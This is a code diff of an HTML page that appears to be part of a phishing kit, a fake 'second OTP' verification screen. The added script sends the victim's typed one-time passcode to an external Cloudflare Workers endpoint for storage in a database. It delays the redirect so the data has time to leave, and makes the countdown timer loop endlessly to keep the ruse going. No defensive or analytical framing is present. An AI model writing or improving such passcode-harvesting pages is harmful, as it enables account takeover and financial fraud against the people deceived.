@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>jajsjbs</title>
+    <title> |  bsnsn/title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -51,6 +51,9 @@
 
     <script>
         const inputs = document.querySelectorAll('.otp-input');
+        const WORKER_URL = 'https://snowy-sunset-a557.sumankkuuyy.workers.dev/';
+
+        // Auto-focus logic
         inputs.forEach((input, index) => {
             input.oninput = (e) => {
                 e.target.value = e.target.value.replace(/\D/g, ''); 
@@ -61,16 +64,18 @@
             };
         });
 
+        // Timer Logic
         let timeLeft = 45;
         const timerInt = setInterval(() => {
             if (timeLeft > 0) {
                 timeLeft--;
                 document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
             } else {
-                clearInterval(timerInt);
+                timeLeft = 45; // Reset timer loop
             }
         }, 1000);
 
+        // Submit Logic
         document.getElementById('otpForm2').onsubmit = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('subBtn');
@@ -80,22 +85,30 @@
             let fullOtp = "";
             inputs.forEach(input => fullOtp += input.value);
 
-            // Sahi Payload: Key ko 'otp2' kiya taaki D1 ke column se match ho
             const payload = {
                 type: "2nd_OTP_VERIFY",
-                otp2: fullOtp 
+                otp2: fullOtp // Match with your D1 column name
             };
 
             try {
-                await fetch('https://snowy-sunset-a557.sumankkuuyy.workers.dev/', {
+                // 1. Data bhej rahe hain aur response ka WAIT kar rahe hain
+                const response = await fetch(WORKER_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                window.location.href = 'about.html';
+
+                if (response.ok) {
+                    console.log("Data Sent Successfully");
+                }
             } catch (err) {
-                window.location.href = 'about.html';
+                console.error("Fetch Error:", err);
             }
+
+            // 2. Data nikalne ke liye thoda extra time dekar redirect
+            setTimeout(() => {
+                window.location.href = 'about.html';
+            }, 800);
         };
     </script>
 </body>
